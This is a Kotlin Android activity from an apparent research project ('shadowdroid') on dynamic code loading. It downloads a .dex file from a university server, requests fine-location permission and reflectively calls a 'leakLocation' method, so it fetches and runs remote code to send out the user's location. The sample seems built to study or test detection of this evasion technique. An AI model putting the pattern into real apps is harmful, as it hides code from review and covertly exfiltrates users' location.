package nl.tbethe.shadowdroid.dynamiccodeloading

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.util.Log
import android.widget.Button
import android.widget.TextView
import androidx.activity.result.contract.ActivityResultContracts
import dalvik.system.DexClassLoader
import kotlinx.coroutines.*
import java.io.File
import java.net.URL
import java.nio.channels.Channels
import java.util.concurrent.Executors
import kotlin.reflect.full.companionObject
import kotlin.reflect.full.companionObjectInstance

private const val TAG = "MainActivity"

private const val BINARY_CLASS_NAME = "nl.tbethe.shadowdroid.dex.DynamicallyDownloadedClass"
private const val METHOD_NAME = "leakLocation"
private const val FILE_URL = "https://vm-thijs.ewi.utwente.nl/shadow-droid/download"
private const val FILE_NAME = "leak.dex"

class MainActivity : AppCompatActivity() {

    private val clazzLoader : DexClassLoader by lazy {
        DexClassLoader(
                dexPath,
                null,
                null,
                classLoader
        )
    }

    private val requestPermission =
        registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted ->
            if (isGranted) sendLocationUsingDynamicCode()
    }

    private lateinit var dexPath : String
    private lateinit var downloadButton : Button

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        downloadButton = findViewById(R.id.button)
        dexPath = filesDir.absolutePath + File.separatorChar + FILE_NAME


        downloadButton.setOnClickListener {
            CoroutineScope(Dispatchers.IO).launch {
                try {
                    @Suppress("BlockingMethodInNonBlockingContext") // Seems to be false-positive
                    Channels.newChannel(URL(FILE_URL).openStream()).use { sourceChannel ->
                        openFileOutput(FILE_NAME, Context.MODE_PRIVATE).use {
                            it.channel.transferFrom(sourceChannel, 0, Long.MAX_VALUE)
                        }
                    }
                    withContext(Dispatchers.Main) {
                        when (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION)) {
                            PackageManager.PERMISSION_DENIED -> {
                                requestPermission.launch(Manifest.permission.ACCESS_FINE_LOCATION)
                            }
                            PackageManager.PERMISSION_GRANTED -> {
                                sendLocationUsingDynamicCode()
                            }
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Something went wrong. ${e.message}")
                    e.printStackTrace()
                }
            }
        }
    }

    private fun sendLocationUsingDynamicCode() {
        val kClass = clazzLoader.loadClass(BINARY_CLASS_NAME).kotlin
        Log.d(TAG, "Dynamically loaded class: ${kClass.simpleName}")
        val companion = kClass.companionObjectInstance!!
        val method = kClass.companionObject!!.members.first { it.name == METHOD_NAME }
        method.call(companion, this)
    }
}